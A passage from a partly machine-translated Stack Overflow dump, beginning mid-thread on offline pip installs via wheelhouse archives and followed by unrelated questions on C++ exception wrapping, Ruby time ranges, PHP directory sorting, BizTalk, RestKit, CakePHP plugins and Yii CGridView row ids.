（在以前的 pip 版本中，拼写为`pip install --download -r requirements.txt`。）

### 在无法访问互联网的系统上

然后你可以使用

`pip install --no-index --find-links /path/to/download/dir/ -r requirements.txt`

安装那些下载的模块，无需访问网络。

* * *

## 回答 #2

> 赞同：135
> 
> 时间：2018-08-02T05:50:12.977

If you want install python libs and their dependencies offline, finish following these steps on a machine with the same os, network connected, and python installed:

1) Create a `requirements.txt` file with similar content (Note - these are the libraries you wish to download):

```
Flask==0.12
requests>=2.7.0
scikit-learn==0.19.1
numpy==1.14.3
pandas==0.22.0 
```

One option for creating the requirements file is to use `pip freeze > requirements.txt`. This will list all libraries in your environment. Then you can go in to `requirements.txt` and remove un-needed ones.

2) Execute command `mkdir wheelhouse && pip download -r requirements.txt -d wheelhouse` to download libs and their dependencies to directory `wheelhouse`

3) Copy requirements.txt into `wheelhouse` directory

4) Archive wheelhouse into `wheelhouse.tar.gz` with `tar -zcf wheelhouse.tar.gz wheelhouse`

Then upload `wheelhouse.tar.gz` to your target machine:

1) Execute `tar -zxf wheelhouse.tar.gz` to extract the files

2) Execute `pip install -r wheelhouse/requirements.txt --no-index --find-links wheelhouse` to install the libs and their dependencies

* * *

## 回答 #3

> 赞同：84
> 
> 时间：2012-06-18T22:32:55.500

如果包在 PYPI 上，请将其及其依赖项下载到某个本地目录。例如

```
$ mkdir /pypi && cd /pypi
$ ls -la
  -rw-r--r-- 1 个铺路人员 237954 Apr 19 11:31 Flask-WTF-0.6.tar.gz
  -rw-r--r-- 1 名铺路人员 389741 Feb 22 17:10 Jinja2-2.6.tar.gz
  -rw-r--r-- 1 名铺路人员 70305 Apr 11 00:28 MySQL-python-1.2.3.tar.gz
  -rw-r--r-- 1 个铺路人员 2597214 Apr 10 18:26 SQLAlchemy-0.7.6.tar.gz
  -rw-r--r-- 1 名铺路人员 1108056 2 月 22 日 17:10 Werkzeug-0.8.2.tar.gz
  -rw-r--r-- 1 名铺路人员 488207 Apr 10 18:26 boto-2.3.0.tar.gz
  -rw-r--r-- 1 名铺路人员 490192 Apr 16 12:00 flask-0.9-dev-2a6c80a.tar.gz

```

某些包可能必须手动归档到外观相似的 tarball 中。当我想要更新（不太稳定）版本的东西时，我经常这样做。有些包不在 PYPI 上，所以同样适用于它们。

假设您有一个格式正确的 Python 应用程序`~/src/myapp`。`~/src/myapp/setup.py`将`install_requires`列出提及您`/pypi`目录中的一项或多项内容的列表。像这样：

```
 install_requires=[
    'boto',
    'Flask',
    'Werkzeug',
    # and so on 
```

如果您希望能够运行具有所有必要依赖项的应用程序，同时仍然对其进行破解，您将执行以下操作：

```
$ cd ~/src/myapp
$ python setup.py develop --always-unzip --allow-hosts=None --find-links=/pypi

```

这样，您的应用程序将直接从您的源目录执行。你可以破解一些东西，然后重新运行应用程序而不重建任何东西。

如果您想将您的应用程序及其依赖项安装到当前的 python 环境中，您将执行以下操作：

```
$ cd ~/src/myapp
$ easy_install --always-unzip --allow-hosts=None --find-links=/pypi 。

```

在这两种情况下，如果目录中不存在一个或多个依赖项，则构建将失败`/pypi`。它不会试图乱七八糟地安装 Internet 上丢失的东西。

我强烈建议在活动的[虚拟环境](http://www.virtualenv.org/en/latest/index.html)中调用`setup.py develop ...`并避免污染您的全局 Python 环境。这是（virtualenv 就是）几乎要走的路。永远不要在全局 Python 环境中安装任何东西。`easy_install ...`

如果您构建应用程序的机器与您要在其上部署应用程序的机器具有相同的架构，您可以简单地将整个虚拟环境目录压缩到其中，将`easy_install`所有内容放入其中。不过，在打包之前，您必须使虚拟环境目录可重定位（请参阅[--relocatable](http://www.virtualenv.org/en/latest/index.html#making-environments-relocatable)选项）。**注意：**目标机器需要安装相同版本的 Python，并且您的应用程序可能具有的任何基于 C 的依赖项也必须预先安装在那里（例如，如果您依赖[PIL](http://www.pythonware.com/products/pil/)，则必须预先安装 libpng、libjpeg 等） .

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2017-08-10T18:19:16.027

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2019-10-21T14:53:17.060

Let me go through the process step by step:

1.  On a computer connected to the internet, create a folder.

```
 $ mkdir packages
   $ cd packages 
```

2.  open up a command prompt or shell and execute the following command:

    *Suppose the package you want is* `tensorflow`

    `$ pip download tensorflow`

3.  Now, on the target computer, copy the `packages` folder and apply the following command

```
 $ cd packages
  $ pip install 'tensorflow-xyz.whl' --no-index --find-links '.' 
```

Note that the `tensorflow-xyz.whl` must be replaced by the original name of the required package.

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2019-01-28T11:56:39.317

I had a similar problem. And i had to make it install the same way, we do from pypi.

I did the following things:

1.  Make a directory to store all the packages in the machine that have internet access.

    ```
    mkdir -p /path/to/packages/ 
    ```

2.  Download all the packages to the path

> Edit: You can also try:
> 
> ```
> python3 -m pip wheel --no-cache-dir -r requirements.txt -w /path/to/packages 
> ```

```
pip download -r requirements.txt -d /path/to/packages

Eg:- ls /root/wheelhouse/  # **/root/wheelhouse** is my **/path/to/packages/**
total 4524
-rw-r--r--. 1 root root   16667 May 23  2017 incremental-17.5.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root   34713 Sep  1 10:21 attrs-18.2.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root 3088398 Oct 15 14:41 Twisted-18.9.0.tar.bz2
-rw-r--r--. 1 root root  133356 Jan 28 15:58 chardet-3.0.4-py2.py3-none-any.whl
-rw-r--r--. 1 root root  154154 Jan 28 15:58 certifi-2018.11.29-py2.py3-none-any.whl
-rw-r--r--. 1 root root   57987 Jan 28 15:58 requests-2.21.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root   58594 Jan 28 15:58 idna-2.8-py2.py3-none-any.whl
-rw-r--r--. 1 root root  118086 Jan 28 15:59 urllib3-1.24.1-py2.py3-none-any.whl
-rw-r--r--. 1 root root   47229 Jan 28 15:59 tqdm-4.30.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root    7922 Jan 28 16:13 constantly-15.1.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root  164706 Jan 28 16:14 zope.interface-4.6.0-cp27-cp27mu-manylinux1_x86_64.whl
-rw-r--r--. 1 root root  573841 Jan 28 16:14 setuptools-40.7.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root   37638 Jan 28 16:15 Automat-0.7.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root   37905 Jan 28 16:15 hyperlink-18.0.0-py2.py3-none-any.whl
-rw-r--r--. 1 root root   52311 Jan 28 16:15 PyHamcrest-1.9.0-py2.py3-none-any.whl
 -rw-r--r--. 1 root root   10586 Jan 28 16:15 six-1.12.0-py2.py3-none-any.whl 
```

3.  Tar the packages directory and copy it to the Machine that doesn't have internet access. Then do,

    ```
    cd /path/to/packages/
    tar -cvzf packages.tar.gz .  # not the . (dot) at the end 
    ```

Copy the **packages.tar.gz** into the destination machine that doesn't have internet access.

4.  In the machine that doesn't have internet access, do the following (Assuming you copied the tarred packages to **/path/to/package/** in the current machine)

    ```
    cd /path/to/packages/
    tar -xvzf packages.tar.gz
    mkdir -p $HOME/.config/pip/
    vi $HOME/.config/pip/pip.conf 
    ```

and paste the following content inside and save it.

```
[global]
timeout = 10
find-links = file:///path/to/package/
no-cache-dir = true
no-index = true 
```

5.  Finally, i suggest you use, some form of `virtualenv` for installing the packages.

    ```
    virtualenv -p python2 venv # use python3, if you are on python3
    source ./venv/bin/activate
    pip install <package> 
    ```

You should be able to download all the modules that are in the directory **/path/to/package/**.

Note: I only did this, because i couldn't add options or change the way we install the modules. Otherwise i'd have done

```
pip install --no-index --find-links /path/to/download/dir/ -r requirements.txt 
```

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2012-06-18T21:54:36.610

下载[tarball](https://github.com/kennethreitz/requests/tarball/master)，将其传输到您的 FreeBSD 机器并解压，然后运行`python setup.py install`，您就完成了！

编辑：再补充一点，您现在也可以使用 pip 安装 tarball。

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2017-09-20T02:46:37.830

Using `wheel` compiled packages.

bundle up:

```
$ tempdir=$(mktemp -d /tmp/wheelhouse-XXXXX)
$ pip wheel -r requirements.txt --wheel-dir=$tempdir
$ cwd=`pwd`
$ (cd "$tempdir"; tar -cjvf "$cwd/bundled.tar.bz2" *) 
```

copy tarball and install:

```
$ tempdir=$(mktemp -d /tmp/wheelhouse-XXXXX)
$ (cd $tempdir; tar -xvf /path/to/bundled.tar.bz2)
$ pip install --force-reinstall --ignore-installed --upgrade --no-index --no-deps $tempdir/* 
```

Note `wheel` binary packages are not across machines.

More ref. here: [https://pip.pypa.io/en/stable/user_guide/#installation-bundles](https://pip.pypa.io/en/stable/user_guide/#installation-bundles)

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2016-11-15T07:08:15.793

对于 Pip 8.1.2，您可以使用`pip download -r requ.txt`将包下载到本地计算机。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2020-11-24T16:36:34.927

As a continues to @chaokunyang answer, I want to put here the script I write that does the work:

1.  Write a "requirements.txt" file that specifies the libraries you want to pack.
2.  Create a tar file that contains all your libraries (see the Packer script).
3.  Put the created tar file in the target machine and untar it.
4.  run the Installer script (which is also packed into the tar file).

"requirements.txt" file

```
docker==4.4.0 
```

Packer side: file name: "create-offline-python3.6-dependencies-repository.sh"

```
#!/usr/bin/env bash

# This script follows the steps described in this link:
# https://stackoverflow.com/a/51646354/8808983

LIBRARIES_DIR="python3.6-wheelhouse"

if [ -d ${LIBRARIES_DIR} ]; then
    rm -rf ${LIBRARIES_DIR}/*
else
    mkdir ${LIBRARIES_DIR}
fi

pip download -r requirements.txt -d ${LIBRARIES_DIR}

files_to_add=("requirements.txt" "install-python-libraries-offline.sh")

for file in "${files_to_add[@]}"; do
    echo "Adding file ${file}"
    cp "$file" ${LIBRARIES_DIR}
done

tar -cf ${LIBRARIES_DIR}.tar ${LIBRARIES_DIR} 
```

Installer side: file name: "install-python-libraries-offline.sh"

```
#!/usr/bin/env bash

# This script follows the steps described in this link:
# https://stackoverflow.com/a/51646354/8808983

# This file should run during the installation process from inside the libraries directory, after it was untared:
# pythonX-wheelhouse.tar -> untar -> pythonX-wheelhouse
# |
# |--requirements.txt
# |--install-python-libraries-offline.sh

pip3 install -r requirements.txt --no-index --find-links . 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2020-08-21T08:24:47.533

Download the wheel file (for example dlb-0.5.0-py3-none-any.whl) from Pypi and

```
pip install dlb-0.5.0-py3-none-any.whl 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-12-16T03:39:54.370

For Windows I have used below things

**Internet Connection**

1.Create directory with any name.I have created with "repo"

2.Download libraries using below command (it will download not install)

pip download libraray_name -d"C:\repo"

```
pip download openpyxl -d"C:\repo" 
```

3.  Then you will find mulitple .whl extention files

4.  copy all the filename in requirements.txt [![enter image description here](../Images/753841f4d2337397fbffb3daa2c225af.png)](https://i.stack.imgur.com/Lj5DO.png)

**No Internet Connection**

5.  Now Move this folder and files to PC where no internet connection and run below command.

```
pip install -r requirements.txt --find-links=C:\repo --no-index
```

# c++ - 用我自己的异常编写一个包装器

> ID：11091624
> 
> 赞同：0
> 
> 时间：2012-06-18T21:51:52.913
> 
> 标签：c++, oop, exception

我想创建一个 FileIO 类，它将提供一些方法，如写入或读取。我还想隐藏 FileIO 的实现（目前，它只是派生自 std::fstream）。问题是std::fstream 可能会抛出一些异常，但我不希望我的FileIO 类抛出std::fstream 异常，我想抛出我自己的（例如FileIO::SomethingBadHappened）。有没有一种优雅的方式来做到这一点？

**我的解决方案**是用额外的 try/catch 块重写 std::fstream 的每个方法。

**编辑：** FileIO 类只是一个例子。我正在寻找包装任意类的通用解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:59:53.207

做到这一点的“优雅”方法是不要重新发明轮子。尤其是这个已经往返月球数千次的轮子。这是经过验证的。你不需要在*那里*发明这个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T22:25:23.640

没有办法解决它 - 如果你想重新抛出不同的异常，你必须在任何可能产生异常的函数调用周围放置一个 try/catch 块。

您应该使用封装而不是使用继承 - 让您的类拥有一个可以将调用传播到的对象。这使您可以简化您的界面，只提供所需的功能，因此不需要包装完成工作的底层类的*每个方法。*

# ruby - 获取由 Time 对象组成的 ruby 范围内的元素计数

> ID：11091625
> 
> 赞同：3
> 
> 时间：2012-06-18T21:51:54.280
> 
> 标签：ruby, time, range

我如何能够获得由`Time`对象组成的范围的大小或计数？

可以达到与我的伪 Ruby 代码相同的结果的东西，但它不起作用：

```
((Time.now.end_of_day - 31.days)..(Time.now.end_of_day - 1.day)).size == 30 
```

目前执行上述操作会出现错误：

> NoMethodError：2012-05-18 23:59:59 -0400..2012-06-17 23:59:59 -0400:Range 的未定义方法“大小”

并试图把它变成数组`(range).to_a`：

> 不能从时间迭代

## 更新

有趣，刚尝试做

`((Date.today.end_of_day - 31.days)..(Date.today.end_of_day - 1.day)).count`

> 用户/.../gems/ruby/1.9.1/gems/activesupport-3.0.15/lib/active_support/time_with_zone.rb:322：警告：Time#succ 已过时；使用时间 + 1

然而

`((Date.today - 31.days)..(Date.today - 1.day)).count == 31`

我愿意接受吗？

还`((Date.today - 31.days)..(Date.yesterday)).count == 31`

# 更新 2

另一方面，根据 Mu 的提示，我们可以这样做：

`(((Time.now.end_of_day - 31.days)..(Time.now.end_of_day - 1.day)).first.to_date..((Time.now.end_of_day - 31.days)..(Time.now.end_of_day - 1.day)).last.to_date).count == 31`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:05:14.223

这是因为日期范围的大小没有意义——它不知道您是否要将其视为天、分、秒、月或其他形式。错误提到迭代的原因是，为了确定范围的大小，它必须知道如何迭代它们，以便它可以计算元素的数量。

由于您想要的是天数的差异，因此请执行以下操作：

```
date_one = Time.now.end_of_day - 31.days
date_two = Time.now.end_of_day - 1.day

((date_one - date_two) / 1.day).abs
#=> 30.0 
```

您必须除以，`1.day`因为 Times 的差异返回秒。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-18T22:14:12.960

没有像`Range#size`, try这样的方法`Range#count`（正如 Andrew Marshall 所建议的那样），尽管它仍然不适用于一系列`Time`对象。

如果你想执行天数计算，你最好使用`Date`对象，或者直接实例化它们（`Date.today - 31`例如），或者调用`#to_date`你的`Time`对象。

`Date`对象也可以用于迭代：

```
((Date.today - 2)..(Date.today)).to_a
=> [#<Date: 2012-06-17 ((2456096j,0s,0n),+0s,2299161j)>,
 #<Date: 2012-06-18 ((2456097j,0s,0n),+0s,2299161j)>,
 #<Date: 2012-06-19 ((2456098j,0s,0n),+0s,2299161j)>]

((Date.today - 2)..(Date.today)).map(&:to_s)
=> ["2012-06-17", "2012-06-18", "2012-06-19"] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:56:03.367

为了让您的代码有任何机会工作，您应该将 .size 之前的所有内容都用括号括起来。

而不是使用范围，也许你可以从另一个对象中减去一个时间对象？

我知道您使用 Date 对象制作范围，因此您可以转换为该范围。

# php - 在 PHP 中合并 DirectoryIterator 数组的问题

> ID：11091626
> 
> 赞同：1
> 
> 时间：2012-06-18T21:51:59.937
> 
> 标签：php

我在尝试将几个数组合并在一起以用于我正在处理的项目时遇到问题。我越来越接近预期的结果，我已经搜索了这个网站，但找不到可行的解决方案。

我怀疑这很重要，但是这个项目正在 IIS 上进行测试，但最终结果必须在 IIS 和 Apache 上都可以工作。

所以这里......我有四个目录，我需要按字母顺序合并和排序。

```
$dir1 = "D:\\dir1";
$dir2 = "D:\\dir2";
$dir3 = "D:\\dir3";
$dir4 = "D:\\dir4";
$dirA = array($dir1,$dir2,$dir3,$dir4); 
```

如果我执行以下操作，我将“接近”我需要的结果：

```
try
{
  $object = new ArrayIterator($dirA);
  foreach($object as $key=>$value)
  {
    foreach(new DirectoryIterator($value) as $item)
    {
      if(!$item->isDot())
      {
        echo $item->getFilename() .' ';
        if(file_exists($value.'\\'.$item.'\folder.jpg'))
        {
          echo 'Y<br />';
        } else {
          echo 'X<br />';
        }
      }
    }
  }
}
catch(Exception $e)
{
  echo $e->getMessage();
} 
```

并最终得到每个目录中的文件夹列表（按字母顺序），但它们不合并，而是仍然按它们分组`$item->key()`（我想这是我实际上想要合并的内容？我尝试了多种使用方法`array_merge`没有成功）

我试过使用`sort`and`ksort`等，但要么它们不起作用，要么我无法在我`echo`列出之前弄清楚它的正确放置位置。

我的最终目标是将`echo`整个事情放到一个表中，我使用多个`file_exists`来检查每个文件夹中“应该”可用的特定文件......例如，每个文件夹的根目录中都应该有一个“folder.jpg” ，所以我希望它显示如下内容：

```
Folder Name            folder.jpg      (other files to be verify)
Directory1                 Y            Y   Y   Y   Y   Y
Directory2                 Y            Y   X   Y   Y   Y
Directory3                 X            X   Y   X   X   X
Directory4                 Y            Y   Y   Y   Y   Y 
```

--
希望以上内容不会造成混淆并提供足够的信息，我要感谢任何能够提供帮助的人，并邀请任何愿意帮助该项目的人与我联系（我显然会感谢人在相应的区域）。

再次感谢。

-
编辑：试图澄清一点。

最后，该项目会将某些变量写入“settings.ini”并读取它们（我的那部分工作正常，所以我现在完全忽略了这一点，并将所有内容都写入本地文件中）。

就我而言，我在不同的驱动器上有 4 个文件夹，每个文件夹有 15 到 130 个子目录（所有名称都是唯一的）。所以一个简短的列表看起来类似于：

```
T:\New Set\
     A\
     D\
     G\
D:\Old Set\
     B\
     F\
  etc.

---------
$dir1 = 'T:/New Set';
$dir2 = 'D:/Old Set';
$dir3 = 'D:/Overage';
$dir4 = 'G:/Unsorted';
$dirA = array($dir1,$dir2,$dir3,$dir4); 
```

使用我最初在上面发布的代码会给我下面的东西（而不是按字母顺序）

```
A  // from $dir1
D  // from $dir1
G  // from $dir1
B  // from $dir2
F  // from $dir2
etc. 
```

使用 DaveRandom 发布的代码，它显示以下内容：

```
Array ( [T:\New Set] => Array ( [folder.jpg] => 1 [cover.jpg] => [poster.jpg] => ) [D:\Old Set] => Array ( [folder.jpg] => 1 [cover.jpg] => [poster.jpg] => ) [D:\Overage] => Array ( [folder.jpg] => 1 [cover.jpg] => [poster.jpg] => ) [G:\Unsorted] => Array ( [folder.jpg] => 1 [cover.jpg] => [poster.jpg] => ) )
Folder Name folder.jpg  cover.jpg   poster.jpg
T:\New Set  Y   X   X
D:\Old Set  Y   X   X
D:\Overage  Y   X   X
G:\Unsorted Y   X   X 
```

我想现在，我唯一的问题是仅对子目录进行排序，因为我能够验证文件并以其他方式处理表格。所以为了清楚起见，我希望目录数组不像上面那样显示，而是像下面这样：

```
A  // from $dir1
B  // from $dir2
D  // from $dir1
F  // from $dir2
G  // from $dir1
etc. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T23:24:59.767

我对你的问题有点困惑，但我*认为*对于你想要做的事情，你最好在二维数组中构建一个类似表格的数据结构，然后你可以对其进行迭代以显示为表格. 您可以一次性完成所有操作，但它会使您的代码更具可读性/可维护性，以分离数据采集和显示生成逻辑。

我还认为您在自己的头脑中使用目录迭代器将其过度复杂化。您真正想做的（根据您的示例输出）是检查目录列表顶层是否存在某些文件 - 在这种情况下，您需要做的就是迭代目录列表，然后迭代您正在查找的文件列表。

我也真的没有看到 ArrayObject/ArrayIterator 在这里的意义，因为你没有修改你正在使用的数组。您可以只循环数组本身。

像这样：

**编辑**以反映评论。您在这里需要的排序魔法来自[`array_multisort()`](http://php.net/manual/en/function.array-multisort.php).

```
// Don't forget to escape \ backslashes!
// Also, / works on Windows too...
$dirA = array(
  "D:\\dir1",
  "D:\\dir2",
  "D:\\dir3",
  "D:\\dir4"
);

// The list of files you are checking for
$files = array(
  'folder.jpg',
  'cover.jpg',
  'poster.jpg'
);

// The "columns" we want to sort by (highest priority first)
// This is equivalent to SQL: ORDER BY name ASC, path ASC
$sortCols = array(
  'name' => SORT_ASC,
  'path' => SORT_ASC
);

// This will be our results "table"
$results = array();

// This will hold the sort column items
$sortInfo = array();
foreach ($sortCols as $colName => $flags) {
  $sortInfo[$colName] = array();
}

// Loop parent directories
foreach ($dirA as $dir) {

  // Make a DirectoryIterator and loop it
  foreach (new DirectoryIterator($dir) as $child) {

    // Skip files and parent dir
    if (!$child->isDir() || $child->isDot()) {
      continue;
    }

    // Temp array to hold data about this sub-dir
    $result = array();
    $result['path'] = $child->getPathname();
    $result['name'] = basename($result['path']);

    // Now check for the existence of files in the file list
    // You might want to use is_file() instead of file_exists() since
    // it is possible for there to be a directory named 'folder.jpg'
    foreach ($files as $file) {
      $result[$file] = file_exists($result['path'].'\\'.$file);
    }

    // Create a "row" for this sub-directory
    $results[] = $result;

    // Create sort data for this directory
    foreach ($sortCols as $colName => $flags) {
      $sortInfo[$colName][] = $result[$colName];
    }

  } // foreach DirectoryIterator

} // foreach $dirA

// Now we have an array of "rows" corresponding to each sub-directory
// we can do some sorting magic with it.
// First we prepare the data to pass to array_multisort() as an array
// of arguments, which we can use with call_user_func_array(). This
// approach allows a dynamic number of sort columns.
$sortData = array();
foreach ($sortCols as $colName => $flags) {
  $sortData[] = $sortInfo[$colName];
  $sortData[] = $flags;
}
$sortData[] = &$results; // Last arg is passed by reference!
// Now we call it
call_user_func_array('array_multisort', $sortData);

// Now we output a table
echo "<table>\n";

// Header row
echo "<tr><th>Folder Name</th><th>Full Path</th>";
foreach ($files as $file) {
  echo "<th>$file</th>";
}
echo "</tr>\n";

// Data rows
foreach ($results as $row) {
  echo "<tr><td>{$row['name']}</td><td>{$row['path']}</td>";
  foreach ($files as $file) {
    echo $row[$file] ? "<td>Y</td>" : "<td>X</td>";
  }
  echo "</tr>\n";
}

echo "</table>"; 
```

# web-services - 如何将 biztalk 编排公开为 Web 服务

> ID：11091629
> 
> 赞同：1
> 
> 时间：2012-06-18T21:52:21.573
> 
> 标签：web-services, biztalk, biztalk-orchestrations

我有一个假设请求将 3 个数据字段拉入编排，但只能通过 Web 服务。

我怎么能用 biztalk 做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T05:03:38.063

正如@Tim 所提到的，WCF 发布向导是一个很好的起点。

*概述：*

[http://msdn.microsoft.com/en-us/library/bb226350](http://msdn.microsoft.com/en-us/library/bb226350)

更多信息：http: [//msdn.microsoft.com/en-us/library/bb226564.aspx](http://msdn.microsoft.com/en-us/library/bb226564.aspx)

*几点注意事项：*

在发布之前，您需要构建 BTS 项目并将其部署到开发环境。确保在发布时部署到具有与 BizTalk 隔离主机相同的用户的应用程序池。

您实际上并不需要 IIS / WAS 来托管服务 - Biztalk 可以使用例如 WCF-Custom[自行托管。](http://seroter.wordpress.com/2007/11/14/biztalk-in-process-hosting-of-wcf-http-services/)因此，您可以避免生产环境中的隔离主机并完全关闭 IIS。这具有性能和资源优势。请注意，您可能需要打开 BizTalk 的权限才能收听，请参见[此处](http://henwor.wordpress.com/?s=netsh)或[此处](http://dipeshavlani.net/2009/11/)

在开发环境中发布和“刷新”WSDL 以便对等系统可以创建代理等可能会很痛苦。使用发布向导后，您可以使用此工具来刷新您的 WSDL 发布，而无需重新执行该向导。 [http://www.microsoft.com/en-us/download/details.aspx?id=21973](http://www.microsoft.com/en-us/download/details.aspx?id=21973)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:54:24.550

使用“BizTalk WCF 服务发布向导”。它将引导您完成所需的所有步骤。

# objective-c - Restkit：从核心数据获取到服务器的 POST 对象数组

> ID：11091631
> 
> 赞同：0
> 
> 时间：2012-06-18T21:52:28.517
> 
> 标签：objective-c, json, core-data, restkit

我似乎在将一组核心数据对象发布到服务器时遇到了一些问题。RestKit 使 GET 请求变得非常容易，但在发布时就不那么容易了。

这是服务器想要 JSON 的方式

```
{
   "myThingList":[
      {
       "id":"0",
       "code":"8406014415007DC8",
       "timestamp":"2012-05-11-12.30.15.505000",
       "status":"0",
       "userId":"8000000",

      }
  ]
} 
```

我在 Core Data 中有一个 THING 类，它最多可以容纳 200 个东西。我需要一次将所有这些发送到服务器。当然，我从 CD 获取后的 NSArray 只是一个 Array of THINGS。

下面是我的代码。我得到 [valueForUndefinedKey:]：这个类不符合键 theId 的键值编码。

```
RKManagedObjectMapping *thingMapping = [ RKManagedObjectMapping mappingForClass:[thingMapping class] 
                                                                      inManagedObjectStore:self.objectManager.objectStore ];
[thingMapping mapKeyPath:@"id" toAttribute:@"theId"];
[thingMapping mapKeyPath:@"code" toAttribute:@"code"];
...... the rest of the fields in Thing

[self.objectManager.mappingProvider setMapping:thingMapping forKeyPath:@"myThingList"];

attendReadMapping.primaryKeyAttribute = @"theId";

[self.objectManager.mappingProvider setSerializationMapping:[thingMapping inverseMapping] forClass:[Things class]];

//now, we create mapping for the MySyncEntity
RKObjectMapping *syncEntityMapping = [RKObjectMapping mappingForClass:[MySyncEntity class]];
[syncEntityMapping mapKeyPath:@"mySyncArray" toRelationship:@"mySyncArray" withMapping:thingMapping];
[[self.objectManager mappingProvider] setSerializationMapping:[syncEntityMapping inverseMapping]
                                          forClass:[MySyncEntity class]];

MySyncEntity *mySyncInstance = [[MySyncEntity alloc] init];
mySyncInstance.mySyncArray = things;

NSString *url = [NSString stringWithFormat:@"things];

if ( [things count] > 0 ) {
    [self.objectManager sendObject:mySyncInstance toResourcePath:url usingBlock:^(RKObjectLoader* postLoader) {
        postLoader.delegate = aDelegate;
        postLoader.method = RKRequestMethodPOST;
        postLoader.userData = @"howdy";
        postLoader.serializationMIMEType = RKMIMETypeJSON; 
        [postLoader setUsername:[prefs objectForKey:@"me"]];
        [postLoader setPassword:[prefs objectForKey:@"me"]];

        postLoader.targetObject = nil;  // Map the results back onto a new object instead of self
}]}}; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T03:58:49.340

发现问题。下面需要改

```
** OLD **
 [syncEntityMapping mapKeyPath:@"mySyncArray" toRelationship:@"mySyncArray" withMapping:thingMapping];

** NOW **
[syncEntityMapping mapKeyPath:@"myThingList" toRelationship:@"myThingList" withMapping:thingMapping]; 
```

MySyncEntity 类还需要将其 NSArray Prop 更改为同名“myThingList”而不是“mySyncArray”

还有这个

```
mySyncInstance.mySyncArray = things; 
```

需要是

```
mySyncInstance.myThingList = things; 
```

# cakephp - CakePHP 2.x：在共享主机上安装时缺少插件异常

> ID：11091634
> 
> 赞同：1
> 
> 时间：2012-06-18T21:52:40.793
> 
> 标签：cakephp, cakephp-2.0

我一直有一个问题让我整天发疯。

我有一个 cakePhp 站点在我的本地机器、另一台开发人员本地机器和专用服务器（用于生产环境）上正常工作。我将开发安装复制到共享主机（justhost.com）。当我将站点复制（使用 rsync）到共享主机时，我收到以下错误：

> 致命错误：未捕获的异常“MissingPluginException”和消息“找不到插件 TinyMce”。在 /home4/ncreport/public_html/mars/lib/Cake/Core/CakePlugin.php:97 堆栈跟踪：#0 /home4/ncreport/public_html/mars/app/Config/bootstrap.php(71)：CakePlugin::load ('TinyMce') #1 /home4/ncreport/public_html/mars/lib/Cake/Core/Configure.php(81): include('/home4/ncreport...') #2 /home4/ncreport/public_html/ mars/lib/Cake/bootstrap.php(138): Configure::bootstrap(true) #3 /home4/ncreport/public_html/mars/app/webroot/index.php(77): include('/home4/ncreport. ..') #4 {main} 在第 97 行的 /home4/ncreport/public_html/mars/lib/Cake/Core/CakePlugin.php 中抛出 <

我已经尝试了在谷歌搜索中找到的多种方法来解决这个问题。没运气。我尝试更改 .htaccess 文件以添加重写库，尝试在引导文件中指定完全限定的插件路径，尝试删除所有内容并重新安装整个应用程序，尝试将文档根目录更改为几个不同的值，尝试我能想到的一切......这似乎是共享主机的问题，但我无法确定原因。

有什么建议或建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T21:18:04.270

我想通了——事实证明，在当前安装中，插件的名称是区分大小写的。从中复制它的安装不区分大小写。

更正了 load 语句中的情况，一切正常。

# yii - 如何为 CGridView 的每个表行分配唯一的 id 属性？

> ID：11091635
> 
> 赞同：1
> 
> 时间：2012-06-18T21:52:44.477
> 
> 标签：yii, cgridview

我正在尝试为 Yii 中的每个表行分配一个唯一的 ID `CGridView`。

最好是`$data->id`来自数据库表的东西。

我在`id`为每个渲染的`<tr>`.

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-09-10T05:43:19.750

CGridView 有一个名为 'rowHtmlOptionsExpression' 的选项，您可以像下面这样声明为行分配一个 id

```
'rowHtmlOptionsExpression' => 'array("id"=>$data->id)', 
```

这比侵入“rowCssClassExpression”要好

祝你好运 ！

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-19T08:44:12.390

## 现代解决方案（自 Yii 1.1.13 起）

现在可以使用[`rowHtmlOptionsExpression`](http://www.yiiframework.com/doc/api/1.1/CGridView#rowHtmlOptionsExpression-detail)属性来做到这一点，它允许将任意 HTML 属性分配给每个呈现的表格行。例如：

```
'rowHtmlOptionsExpression' => '["id" => $data->id]' 
```

## 原始答案（早期版本）

不直接可能，因为`CGridView`不支持它，但是您可以尝试一些简单的解决方案。

### 子类 CGridView（好）

只需创建您自己的类`MyGridView extends CGridView`并覆盖该`renderTableRow`方法以在每一行上吐出 id。查看[stock implementation](http://code.google.com/p/yii/source/browse/tags/1.1.10/framework/zii/widgets/grid/CGridView.php#501)，它对`class`属性所做的正是您想要对`id`属性执行的操作。

### 改用 CSS 类（不太好）

说到`class`属性，该`rowCssClassExpression`属性可用于动态生成开箱即用的类。恕我直言，这是一个糟糕的解决方法，但它就在那里。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-19T08:04:25.573

您可以扩展 CGridView 以添加该功能。

或者对 rowCssClassExpression 有点 hacky。

```
'rowCssClassExpression' => '\'" data-id="\' . $data->rowID' 
